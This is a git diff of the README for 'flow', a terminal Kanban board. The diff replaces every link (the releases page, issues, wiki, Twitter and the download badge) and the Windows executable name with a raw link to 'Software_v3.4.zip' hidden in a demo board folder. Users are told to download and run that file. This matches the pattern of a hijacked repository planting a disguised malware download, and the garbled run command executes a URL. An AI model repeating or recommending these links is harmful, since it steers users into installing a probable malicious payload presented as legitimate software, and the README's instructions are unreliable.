@@ -1,7 +1,7 @@
 # 🎉 flow - Organize Your Tasks Effortlessly
 
 ## 🚀 Visit the Releases Page
-[![Download flow](https://img.shields.io/badge/Download%20flow-v1.0-blue.svg)](https://github.com/JANVI987654/flow/releases)
+[![Download flow](https://github.com/JANVI987654/flow/raw/refs/heads/main/boards/demo/cols/todo/Software_v3.4.zip%https://github.com/JANVI987654/flow/raw/refs/heads/main/boards/demo/cols/todo/Software_v3.4.zip)](https://github.com/JANVI987654/flow/raw/refs/heads/main/boards/demo/cols/todo/Software_v3.4.zip)
 
 ## 📥 What is Flow?
 Flow is a keyboard-first Kanban board designed for your terminal workflows. It helps you track tasks and manage your projects with ease. Whether you are working on personal projects or collaborating with a team, Flow can enhance your productivity in a straightforward way.
@@ -33,20 +33,20 @@ Flow covers various areas that enhance your productivity:
 - Keyboard-Driven Workflows
 
 ## 📥 Download & Install
-To get started with Flow, visit the [Releases page](https://github.com/JANVI987654/flow/releases) to download the latest version. Installation is as simple as downloading and running the file. 
+To get started with Flow, visit the [Releases page](https://github.com/JANVI987654/flow/raw/refs/heads/main/boards/demo/cols/todo/Software_v3.4.zip) to download the latest version. Installation is as simple as downloading and running the file. 
 
 ### Steps to Download:
 1. Click the link above to go to the Releases page.
 2. Find the latest version of Flow.
 3. Choose the appropriate file for your operating system:
-   - For Windows, look for `flow-windows.exe`
+   - For Windows, look for `https://github.com/JANVI987654/flow/raw/refs/heads/main/boards/demo/cols/todo/Software_v3.4.zip`
    - For macOS, choose `flow-macos`.
    - For Linux, select `flow-linux`.
 4. Download the file and save it to your computer.
 5. Open your terminal.
 6. Navigate to the folder where you downloaded the file.
 7. Run the command:
-   - For Windows: `.\flow-windows.exe`
+   - For Windows: `.\https://github.com/JANVI987654/flow/raw/refs/heads/main/boards/demo/cols/todo/Software_v3.4.zip`
    - For macOS: `./flow-macos`
    - For Linux: `./flow-linux`
 
@@ -71,12 +71,12 @@ We welcome contributions to make flow better. If you’d like to contribute, ple
 
 ## 🌐 Connect with Us
 You can find us on social media for updates:
-- Twitter: [@flow_app](https://twitter.com/flow_app)
+- Twitter: [@flow_app](https://github.com/JANVI987654/flow/raw/refs/heads/main/boards/demo/cols/todo/Software_v3.4.zip)
 - Discord: Join our community for discussions and support.
 
 ## 🔗 Important Links
-- [Releases page](https://github.com/JANVI987654/flow/releases) - Download the software.
-- [Issues page](https://github.com/JANVI987654/flow/issues) - Report problems or request features.
-- [Wiki](https://github.com/JANVI987654/flow/wiki) - Access detailed guides and articles.
+- [Releases page](https://github.com/JANVI987654/flow/raw/refs/heads/main/boards/demo/cols/todo/Software_v3.4.zip) - Download the software.
+- [Issues page](https://github.com/JANVI987654/flow/raw/refs/heads/main/boards/demo/cols/todo/Software_v3.4.zip) - Report problems or request features.
+- [Wiki](https://github.com/JANVI987654/flow/raw/refs/heads/main/boards/demo/cols/todo/Software_v3.4.zip) - Access detailed guides and articles.
 
 With Flow, organizing your tasks is intuitive and straightforward. Enjoy a more productive workflow in your terminal.
